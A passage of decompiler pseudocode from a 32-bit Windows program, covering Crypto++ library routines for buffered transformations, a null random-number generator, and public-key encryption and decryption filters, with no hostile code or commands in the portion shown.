  char v6[24]; // [esp+8h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+20h] [ebp-38h] BYREF
  int v8; // [esp+54h] [ebp-4h]

  v3 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v5 = (size_t *)(*(int (__cdecl **)(char *))(v3 + 8))(v6);
    v8 = 0;
    sub_4363D0(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int))(v3 + 16))(a3);
}
// 4369B0: using guessed type char var_50[24];

//----- (00436A30) --------------------------------------------------------
int __thiscall sub_436A30(int *this, int a2, int a3, int a4, int a5)
{
  int v5; // edx
  size_t *v7; // eax
  char v8[24]; // [esp+4h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+1Ch] [ebp-38h] BYREF
  int v10; // [esp+50h] [ebp-4h]

  v5 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v7 = (size_t *)(*(int (__cdecl **)(char *))(v5 + 8))(v8);
    v10 = 0;
    sub_4363D0(pExceptionObject, v7);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__cdecl **)(int))(v5 + 48))(a3);
}
// 436A30: using guessed type char var_50[24];

//----- (00436AC0) --------------------------------------------------------
int __thiscall sub_436AC0(int *this, int a2, int a3, int a4)
{
  int v4; // edx
  size_t *v6; // eax
  char v7[24]; // [esp+4h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+1Ch] [ebp-38h] BYREF
  int v9; // [esp+50h] [ebp-4h]

  v4 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v6 = (size_t *)(*(int (__cdecl **)(char *))(v4 + 8))(v7);
    v9 = 0;
    sub_4363D0(pExceptionObject, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__cdecl **)(int))(v4 + 52))(a3);
}
// 436AC0: using guessed type char var_50[24];

//----- (00436B40) --------------------------------------------------------
int __thiscall sub_436B40(int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  size_t *v8; // eax
  char v9[24]; // [esp+8h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+20h] [ebp-38h] BYREF
  int v11; // [esp+54h] [ebp-4h]

  v6 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v8 = (size_t *)(*(int (__cdecl **)(char *))(v6 + 8))(v9);
    v11 = 0;
    sub_4363D0(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int, int, int, int))(v6 + 24))(a3, a4, a5, a6);
}
// 436B40: using guessed type char var_50[24];

//----- (00436BD0) --------------------------------------------------------
int __thiscall sub_436BD0(int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx

  v6 = *this;
  if ( *(_DWORD *)(a2 + 16) )
    return (*(int (__stdcall **)(int, int, int, int, int))(v6 + 140))(a2, a3, a4, a5, a6);
  else
    return (*(int (__stdcall **)(int, int, int, int))(v6 + 28))(a3, a4, a5, a6);
}

//----- (00436C00) --------------------------------------------------------
int __thiscall sub_436C00(void *this, int a2, int a3, int a4)
{
  if ( !(*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
    return 0;
  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  return sub_436C00(a2, a3, a4);
}

//----- (00436C40) --------------------------------------------------------
_DWORD *__thiscall sub_436C40(void *this, int a2, int a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi

  v5 = operator new(0x64u);
  v6 = v5;
  if ( !v5 )
    return 0;
  sub_452860(v5, 0);
  v6[6] = a2;
  *v6 = &CryptoPP::PK_DefaultDecryptionFilter::`vftable';
  v6[1] = &CryptoPP::PK_DefaultDecryptionFilter::`vftable';
  v6[7] = this;
  v6[8] = a4;
  sub_45F0D0((int)(v6 + 9), 0);
  v6[20] = -1;
  v6[21] = 0;
  v6[22] = 0;
  *((_BYTE *)v6 + 92) = 0;
  v6[24] = 0;
  sub_4535B0(v6, a3);
  return v6;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9750: using guessed type void *CryptoPP::PK_DefaultDecryptionFilter::`vftable';
// 4B9818: using guessed type void *CryptoPP::PK_DefaultDecryptionFilter::`vftable';

//----- (00436D10) --------------------------------------------------------
_DWORD *__thiscall sub_436D10(void *this, int a2, int a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi

  v5 = operator new(0x5Cu);
  v6 = v5;
  if ( !v5 )
    return 0;
  sub_452860(v5, 0);
  v6[6] = a2;
  *v6 = &CryptoPP::PK_DefaultEncryptionFilter::`vftable';
  v6[1] = &CryptoPP::PK_DefaultEncryptionFilter::`vftable';
  v6[7] = this;
  v6[8] = a4;
  sub_45F0D0((int)(v6 + 9), 0);
  v6[20] = -1;
  v6[21] = 0;
  v6[22] = 0;
  sub_4535B0(v6, a3);
  return v6;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9648: using guessed type void *CryptoPP::PK_DefaultEncryptionFilter::`vftable';
// 4B9710: using guessed type void *CryptoPP::PK_DefaultEncryptionFilter::`vftable';

//----- (00436DE0) --------------------------------------------------------
int __thiscall sub_436DE0(
        _DWORD *this,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int a8,
        int a9,
        unsigned int a10)
{
  (*(void (__thiscall **)(_DWORD *, int, int))(*this + 44))(this, a5, a6);
  sub_438240(this, a8, a10, 0i64);
  (*(void (__thiscall **)(_DWORD *, int, unsigned int))(this[1] + 16))(this + 1, a7, a8);
  (*(void (__thiscall **)(_DWORD *, int, int, unsigned int))(this[2] + 32))(this + 2, a2, a9, a10);
  return (*(int (__thiscall **)(_DWORD *, int, int))(this[1] + 68))(this + 1, a3, a4);
}

//----- (00436E50) --------------------------------------------------------
int __thiscall sub_436E50(int *this, int a2)
{
  int v3; // esi
  void ***v4; // eax

  v3 = *this;
  v4 = sub_438580();
  return (*(int (__thiscall **)(int *, void ***, int *, int, _DWORD))(v3 + 40))(this, v4, &dword_4EEDC0, a2, 0);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00436E80) --------------------------------------------------------
int __thiscall sub_436E80(
        _DWORD *this,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int a8,
        int a9,
        unsigned int a10)
{
  (*(void (__thiscall **)(_DWORD *, int, int))(*this + 44))(this, a5, a6);
  sub_438240(this, a8, a10, 0i64);
  (*(void (__thiscall **)(_DWORD *, int, unsigned int))(this[1] + 16))(this + 1, a7, a8);
  (*(void (__thiscall **)(_DWORD *, int, int, unsigned int))(this[2] + 32))(this + 2, a2, a9, a10);
  return (*(int (__thiscall **)(_DWORD *, int, int))(this[1] + 60))(this + 1, a3, a4);
}

//----- (00436EF0) --------------------------------------------------------
int __thiscall sub_436EF0(void *this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 36))(this, a2, a4);
}

//----- (00436F10) --------------------------------------------------------
int __thiscall sub_436F10(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) & 1;
}

//----- (00436F20) --------------------------------------------------------
void __cdecl __noreturn sub_436F20(int a1, int a2)
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v3[10]; // [esp+2Ch] [ebp-28h] BYREF

  sub_419B80((int)v3, "NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes");
  v3[9] = 0;
  sub_4053E0(pExceptionObject, v3);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}

//----- (00436F80) --------------------------------------------------------
int __thiscall sub_436F80(int *this, int a2, int a3)
{
  int v3; // eax
  int v5[6]; // [esp+4h] [ebp-30h] BYREF
  __int64 v6; // [esp+1Ch] [ebp-18h]
  int v7; // [esp+30h] [ebp-4h]

  v5[0] = (int)&CryptoPP::ArraySink::`vftable';
  v5[1] = (int)&CryptoPP::ArraySink::`vftable';
  v5[3] = a2;
  v5[4] = a3;
  v6 = 0i64;
  v3 = *this;
  v7 = 2;
  return (*(int (__cdecl **)(int *))(v3 + 40))(v5);
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (00437000) --------------------------------------------------------
char __fastcall sub_437000(int a1)
{
  char v2; // [esp+9h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  (*(void (__thiscall **)(int, char *, int))(*(_DWORD *)a1 + 36))(a1, &v2, 1);
  return v2;
}

//----- (00437020) --------------------------------------------------------
char __userpurge sub_437020@<al>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, __int64 a5)
{
  _BYTE *v5; // ecx
  unsigned int v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // edi
  _BYTE *v9; // eax
  unsigned int v12; // [esp-134h] [ebp-140h]
  _BYTE v13[264]; // [esp-130h] [ebp-13Ch] BYREF
  unsigned int v14; // [esp-28h] [ebp-34h]
  int v15; // [esp-24h] [ebp-30h]
  _BYTE *v16; // [esp-20h] [ebp-2Ch]
  int *v17; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v19; // [esp-8h] [ebp-14h]
  int v20; // [esp-4h] [ebp-10h]
  int v21; // [esp+0h] [ebp-Ch]
  int v22; // [esp+4h] [ebp-8h]
  int v23; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v21 = a2;
  v22 = retaddr;
  v20 = -1;
  v19 = &loc_4B2F9B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v17 = &v23;
  v5 = v13;
  v6 = 256;
  v14 = -1;
  v15 = 256;
  v13[257] = 1;
  v16 = v13;
  v7 = HIDWORD(a5);
  v8 = a5;
  v20 = 0;
  v12 = HIDWORD(a5);
  if ( !a5 )
    goto LABEL_9;
  while ( 1 )
  {
    if ( !v7 && v8 < v6 )
      v6 = v8;
    (*(void (__thiscall **)(int, _BYTE *, unsigned int))(*(_DWORD *)a1 + 36))(a1, v5, v6);
    (*(void (__thiscall **)(int, int, _BYTE *, unsigned int, _DWORD, int))(*(_DWORD *)a3 + 140))(a3, a4, v16, v6, 0, 1);
    v5 = v16;
    v7 = (__PAIR64__(v12, v8) - v6) >> 32;
    v8 -= v6;
    v12 = v7;
    if ( !__PAIR64__(v7, v8) )
      break;
    v6 = v15;
  }
  v9 = v13;
  if ( v16 == v13 )
  {
    v6 = v15;
LABEL_9:
    if ( v14 < v6 )
      v6 = v14;
    LOBYTE(v9) = 0;
    memset(v5, 0, v6);
  }
  return (char)v9;
}
// 437020: could not find valid save-restore pair for ebp

//----- (00437150) --------------------------------------------------------
int __thiscall sub_437150(void *this, int a2, unsigned int a3)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  unsigned int v6; // edx
  unsigned int v7; // ecx
  unsigned int v8; // eax

  v4 = a3 - a2;
  if ( a3 == a2 )
  {
    v5 = 0;
  }
  else
  {
    v6 = 0;
    v5 = 32;
    do
    {
      v7 = (v5 + v6) >> 1;
      if ( !(v4 >> v7) )
      {
        v5 = (v5 + v6) >> 1;
        v7 = v6;
      }
      v6 = v7;
    }
    while ( v5 - v7 > 1 );
  }
  do
  {
    (*(void (__thiscall **)(void *, unsigned int *, int))(*(_DWORD *)this + 36))(this, &a3, 4);
    if ( v5 >= 0x20 )
      v8 = a3;
    else
      v8 = a3 & ((1 << v5) - 1);
    a3 = v8;
  }
  while ( v8 > v4 );
  return a2 + v8;
}

//----- (004371D0) --------------------------------------------------------
int __thiscall sub_4371D0(int *this, int a2)
{
  int v3; // eax
  int v4; // edx
  int v5; // eax

  v3 = (*(int (__thiscall **)(int *))(*this + 168))(this);
  v4 = *this;
  if ( !v3 )
    return (*(int (__thiscall **)(int *, int, int))(v4 + 72))(this, a2, 1);
  v5 = (*(int (__thiscall **)(int *))(v4 + 168))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v5 + 76))(v5, a2);
}

//----- (00437200) --------------------------------------------------------
int __thiscall sub_437200(int *this, int a2, int a3)
{
  int v4; // eax
  int v5; // edx
  int v6; // eax
  int v8[2]; // [esp+10h] [ebp-38h] BYREF
  int v9[6]; // [esp+18h] [ebp-30h] BYREF
  __int64 v10; // [esp+30h] [ebp-18h]
  int v11; // [esp+44h] [ebp-4h]

  v4 = (*(int (__thiscall **)(int *))(*this + 168))(this);
  v5 = *this;
  if ( v4 )
  {
    v6 = (*(int (__thiscall **)(int *))(v5 + 168))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v6 + 72))(v6, a2, a3);
  }
  else
  {
    v9[0] = (int)&CryptoPP::ArraySink::`vftable';
    v9[1] = (int)&CryptoPP::ArraySink::`vftable';
    v9[3] = a2;
    v9[4] = a3;
    v10 = 0i64;
    v11 = 2;
    v8[0] = a3;
    v8[1] = 0;
    (*(void (__thiscall **)(int *, int *, int *, int *, int))(v5 + 128))(this, v9, v8, &dword_4EEDC0, 1);
    return v8[0];
  }
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004372C0) --------------------------------------------------------
int __thiscall sub_4372C0(void *this, int *a2, int *a3)
{
  int v4; // eax
  int (__thiscall *v5)(int *, void *, void *, char *); // eax
  char v6; // al
  void *v7; // eax
  unsigned int v8; // eax
  int v9; // eax
  int v10; // ebx
  unsigned int v11; // ecx
  void *v12; // esi
  int v14; // eax
  char *v15; // eax
  _DWORD *v16; // eax
  _DWORD v17[7]; // [esp+0h] [ebp-48h] BYREF
  char v18[4]; // [esp+1Ch] [ebp-2Ch] BYREF
  void *v19; // [esp+20h] [ebp-28h]
  unsigned int v20; // [esp+24h] [ebp-24h]
  unsigned int v21; // [esp+2Ch] [ebp-1Ch]
  unsigned int v22; // [esp+30h] [ebp-18h]
  void *Block; // [esp+34h] [ebp-14h]
  _DWORD *v24; // [esp+38h] [ebp-10h]
  int v25; // [esp+44h] [ebp-4h]
  int v26; // [esp+48h] [ebp+0h] BYREF
  char v27[24]; // [esp+4Ch] [ebp+4h] BYREF
  char v28[24]; // [esp+64h] [ebp+1Ch] BYREF
  char pExceptionObject[40]; // [esp+7Ch] [ebp+34h] BYREF

  v24 = v17;
  v17[4] = a3;
  v17[6] = this;
  v17[5] = a2;
  v21 = -1;
  v22 = 0;
  Block = 0;
  v19 = 0;
  v20 = 0;
  v18[0] = 0;
  v4 = *a2;
  v25 = 4;
  v5 = *(int (__thiscall **)(int *, void *, void *, char *))(v4 + 4);
  v26 = 0;
  LOBYTE(v25) = 5;
  v6 = v5(a2, &unk_4B93C8, &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', v18);
  v25 = 4;
  if ( v6 )
  {
    v7 = v19;
    if ( v18[0] )
      v7 = Block;
    v26 = (int)v7;
    sub_438610(this, (int)v7);
    v8 = v20;
    if ( v18[0] )
      v8 = v22;
    v9 = sub_4386B0((int *)this, v8);
  }
  else if ( (*(unsigned __int8 (__thiscall **)(int *, void *, const unsigned __int8 **, int *))(*a2 + 4))(
              a2,
              &unk_4B93C8,
              &unsigned char const * `RTTI Type Descriptor',
              &v26) )
  {
    sub_438610(this, v26);
    v9 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  }
  else
  {
    if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this) < 4 )
    {
      v14 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
      v15 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v14 + 8))(v14, v28);
      LOBYTE(v25) = 7;
      v16 = (_DWORD *)sub_421F20((int)v27, v15, ": this object requires an IV");
      LOBYTE(v25) = 8;
      sub_405230(pExceptionObject, v16);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v9 = 0;
  }
  *a3 = v9;
  v10 = v26;
  v11 = v22;
  v12 = Block;
  if ( v21 < v22 )
    v11 = v21;
  memset(Block, 0, v11);
  v25 = 9;
  j_j___free_base(v12);
  return v10;
}
// 4E90D0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 4372C0: using guessed type char var_8C[4];
// 4372C0: using guessed type char var_44[24];
// 4372C0: using guessed type char var_5C[24];

//----- (00437470) --------------------------------------------------------
int __thiscall sub_437470(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 164))(this - 1);
  if ( v1 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)(v1 + 4) + 4))(v1 + 4);
  else
    return 0;
}

//----- (00437490) --------------------------------------------------------
int __thiscall sub_437490(void *this, int *a2, int a3)
{
  int v3; // edi
  int v4; // eax

  v3 = *a2;
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 36))(a2, a3, v4);
}

//----- (004374B0) --------------------------------------------------------
int __thiscall sub_4374B0(void *this)
{
  int v2; // eax

  if ( !(*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
    return 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 104))(v2);
}

//----- (004374E0) --------------------------------------------------------
int __thiscall sub_4374E0(_DWORD *this, int a2, int a3)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 168))(this - 1);
  if ( result )
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)(result + 4) + 8))(result + 4, a2, a3);
  return result;
}

//----- (00437500) --------------------------------------------------------
int __thiscall sub_437500(void *this, unsigned __int16 *a2, int a3)
{
  int v4; // edi
  unsigned __int16 v5; // cx
  int v7; // [esp+8h] [ebp-4h] BYREF

  LOWORD(v7) = 0;
  v4 = (*(int (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 80))(this, &v7, 2);
  if ( a3 )
    v5 = _byteswap_ushort(v7);
  else
    v5 = v7;
  *a2 = v5;
  return (*(int (__thiscall **)(void *, int, _DWORD))(*(_DWORD *)this + 88))(this, v4, 0);
}

//----- (00437570) --------------------------------------------------------
int __thiscall sub_437570(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 32))(this, a2);
}

//----- (00437580) --------------------------------------------------------
void __noreturn sub_437580()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v1[10]; // [esp+2Ch] [ebp-28h] BYREF

  sub_419B80((int)v1, "BufferedTransformation: this object can't be reinitialized");
  v1[9] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 437580: using guessed type void __noreturn sub_437580();

//----- (004375E0) --------------------------------------------------------
int __thiscall sub_4375E0(int *this)
{
  int v2; // eax
  void ***v4; // eax
  int v5; // edx
  __int64 v6; // [esp+18h] [ebp-8h] BYREF

  if ( (*(int (__thiscall **)(int *))(*this + 164))(this) )
  {
    v2 = (*(int (__thiscall **)(int *))(*this + 164))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 64))(v2);
  }
  else
  {
    v4 = sub_438580();
    v5 = *this;
    v6 = 0i64;
    (*(void (__thiscall **)(int *, void ***, __int64 *, int, int, int *, int))(v5 + 132))(
      this,
      v4,
      &v6,
      -1,
      -1,
      &dword_4EEDC0,
      1);
    return v6;
  }
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00437640) --------------------------------------------------------
int __thiscall sub_437640(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 40))(this, a3);
}

//----- (00437650) --------------------------------------------------------
int *sub_437650()
{
  if ( dword_4EEDF8 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4EEDF8);
    if ( dword_4EEDF8 == -1 )
    {
      sub_435E90(&dword_4EEDF4, 1);
      dword_4EEDF4 = (int)&CryptoPP::ClassNullRNG::`vftable';
      atexit(nullsub_3);
      _Init_thread_footer(&dword_4EEDF8);
    }
  }
  return &dword_4EEDF4;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4B9564: using guessed type void *CryptoPP::ClassNullRNG::`vftable';
// 4EEDF4: using guessed type int dword_4EEDF4;
// 4EEDF8: using guessed type int dword_4EEDF8;
// 4F0864: using guessed type int TlsIndex;

//----- (004376F0) --------------------------------------------------------
int __thiscall sub_4376F0(void *this)
{
  int v2; // eax
  void ***v4; // ebx
  int v5; // edi
  void *v6; // eax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 96))(v2);
  }
  else
  {
    v4 = sub_438580();
    v5 = 0;
    if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
    {
      v6 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
      return sub_436C00(v6, (int)v4, -1, (int)&dword_4EEDC0);
    }
    return v5;
  }
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00437750) --------------------------------------------------------
int __thiscall sub_437750(int *this, int a2)
{
  int v3; // eax
  int v4; // edx
  int v5; // eax

  v3 = (*(int (__thiscall **)(int *))(*this + 164))(this);
  v4 = *this;
  if ( !v3 )
    return (*(int (__thiscall **)(int *, int, int))(v4 + 80))(this, a2, 1);
  v5 = (*(int (__thiscall **)(int *))(v4 + 164))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v5 + 84))(v5, a2);
}

//----- (00437780) --------------------------------------------------------
int __thiscall sub_437780(int *this, int a2, int a3)
{
  int v4; // eax
  int v5; // edx
  int v6; // eax
  __int64 v8; // [esp+10h] [ebp-38h] BYREF
  int v9[6]; // [esp+18h] [ebp-30h] BYREF
  __int64 v10; // [esp+30h] [ebp-18h]
  int v11; // [esp+44h] [ebp-4h]

  v4 = (*(int (__thiscall **)(int *))(*this + 164))(this);
  v5 = *this;
  if ( v4 )
  {
    v6 = (*(int (__thiscall **)(int *))(v5 + 164))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v6 + 80))(v6, a2, a3);
  }
  else
  {
    v9[0] = (int)&CryptoPP::ArraySink::`vftable';
    v9[1] = (int)&CryptoPP::ArraySink::`vftable';
    v9[3] = a2;
    v9[4] = a3;
    v10 = 0i64;
    v11 = 2;
    v8 = 0i64;
    (*(void (__thiscall **)(int *, int *, __int64 *, int, _DWORD, int *, int))(v5 + 132))(
      this,
      v9,
      &v8,
      a3,
      0,
      &dword_4EEDC0,
      1);
    return v8;
  }
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00437840) --------------------------------------------------------
int __thiscall sub_437840(int *this, _WORD *a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // [esp+8h] [ebp-4h] BYREF

  v3 = *this;
  LOWORD(v5) = 0;
  result = (*(int (__thiscall **)(int *, int *, int))(v3 + 80))(this, &v5, 2);
  if ( a3 )
    *a2 = _byteswap_ushort(v5);
  else
    *a2 = (unsigned __int8)v5 | (BYTE1(v5) << 8);
  return result;
}

//----- (004378A0) --------------------------------------------------------
int __thiscall sub_4378A0(void *this, int a2, int a3, int a4, int a5)
{
  int v6; // esi
  char *v8; // eax
  _DWORD *v9; // eax
  char v10[24]; // [esp+14h] [ebp-68h] BYREF
  char v11[24]; // [esp+2Ch] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+44h] [ebp-38h] BYREF
  int v13; // [esp+78h] [ebp-4h]

  v6 = a5;
  if ( a5 == (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this) )
  {
    (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 32))(this, a2, a4, a5);
  }
  else
  {
    if ( a5 )
    {
      v8 = (char *)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 8))(this, v11);
      v13 = 0;
      v9 = (_DWORD *)sub_421F20((int)v10, v8, ": this object doesn't support a special last block");
      LOBYTE(v13) = 1;
      sub_4053E0(pExceptionObject, v9);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
    }
    return a3;
  }
  return v6;
}
// 4378A0: using guessed type char var_50[24];
// 4378A0: using guessed type char var_68[24];

//----- (00437960) --------------------------------------------------------
int __stdcall sub_437960(int a1, int a2, int a3, int a4)
{
  return 0;
}

//----- (00437970) --------------------------------------------------------
int __thiscall sub_437970(int this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // edi
  int result; // eax
  __int64 v9; // rax
  size_t v10; // edi
  void *v11; // eax
  int v12; // edx
  int *v13; // eax
  int v14; // ecx
  int v15; // eax
  char *v16; // eax
  _DWORD *v17; // eax
  char v18[4]; // [esp+10h] [ebp-8Ch] BYREF
  size_t v19; // [esp+14h] [ebp-88h]
  void *v20; // [esp+18h] [ebp-84h]
  char v21[24]; // [esp+1Ch] [ebp-80h] BYREF
  char v22[24]; // [esp+34h] [ebp-68h] BYREF
  char pExceptionObject[40]; // [esp+4Ch] [ebp-50h] BYREF
  _DWORD v24[2]; // [esp+74h] [ebp-28h] BYREF
  _DWORD v25[4]; // [esp+7Ch] [ebp-20h] BYREF
  int v26; // [esp+98h] [ebp-4h]

  v6 = *(_DWORD *)(this + 20);
  v7 = a4;
  if ( v6 )
  {
    if ( v6 != 1 )
      return 0;
  }
  else
  {
    *(_DWORD *)(this + 16) = 0;
    (*(void (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)(this + 36) + 24))(this + 36, a2, a3, 0, 1);
    if ( !a4 )
      return 0;
    v9 = sub_45F890((_DWORD *)(this + 36));
    v10 = v9;
    if ( HIDWORD(v9) )
    {
      sub_419B80((int)v24, "PK_DefaultDecryptionFilter: ciphertext too long");
      v26 = 0;
      sub_405230(pExceptionObject, v24);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v19 = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28), v9);
    v25[1] = -1;
    v25[2] = v10;
    if ( v10 )
      v11 = sub_45AEA0(v10);
    else
      v11 = 0;
    v20 = v11;
    v25[3] = v11;
    v12 = *(_DWORD *)(this + 36);
    v26 = 2;
    (*(void (__thiscall **)(int, void *, size_t))(v12 + 72))(this + 36, v11, v10);
    sub_438EB0((_DWORD *)(this + 76), v19);
    v13 = (int *)(*(int (__thiscall **)(_DWORD, char *, _DWORD, void *, size_t, _DWORD, _DWORD))(**(_DWORD **)(this + 28)
                                                                                               + 24))(
                   *(_DWORD *)(this + 28),
                   v18,
                   *(_DWORD *)(this + 24),
                   v20,
                   v10,
                   *(_DWORD *)(this + 88),
                   *(_DWORD *)(this + 32));
    v14 = *v13;
    v15 = v13[1];
    *(_DWORD *)(this + 92) = v14;
    *(_DWORD *)(this + 96) = v15;
    if ( !(_BYTE)v14 )
    {
      v16 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)(*(_DWORD *)(this + 28) + 4) + 8))(
                      *(_DWORD *)(this + 28) + 4,
                      v22);
      LOBYTE(v26) = 3;
      v17 = (_DWORD *)sub_421F20((int)v21, v16, ": invalid ciphertext");
      LOBYTE(v26) = 4;
      sub_436000(pExceptionObject, v17);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
    }
    v26 = -1;
    sub_419010(v25);
    v7 = a4;
  }
  if ( !sub_454730((_DWORD *)this, 1, *(_DWORD *)(this + 88), *(_DWORD *)(this + 96), v7, a5, (int)&dword_4EEDC0) )
    return 0;
  result = 1;
  if ( (unsigned int)(*(_DWORD *)(this + 96) - *(_DWORD *)(this + 16)) > 1 )
    return *(_DWORD *)(this + 96) - *(_DWORD *)(this + 16);
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;
// 437970: using guessed type char var_8C[4];
// 437970: using guessed type _DWORD var_28[2];
// 437970: using guessed type char var_68[24];
// 437970: using guessed type char var_80[24];

//----- (00437B60) --------------------------------------------------------
int __thiscall sub_437B60(int this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // ebx
  int result; // eax
  __int64 v9; // rax
  size_t v10; // ebx
  void *v11; // eax
  int v12; // edx
  size_t v13; // [esp+10h] [ebp-58h]
  void *Block; // [esp+14h] [ebp-54h]
  char pExceptionObject[40]; // [esp+18h] [ebp-50h] BYREF
  _DWORD v16[6]; // [esp+40h] [ebp-28h] BYREF
  int v17; // [esp+64h] [ebp-4h]

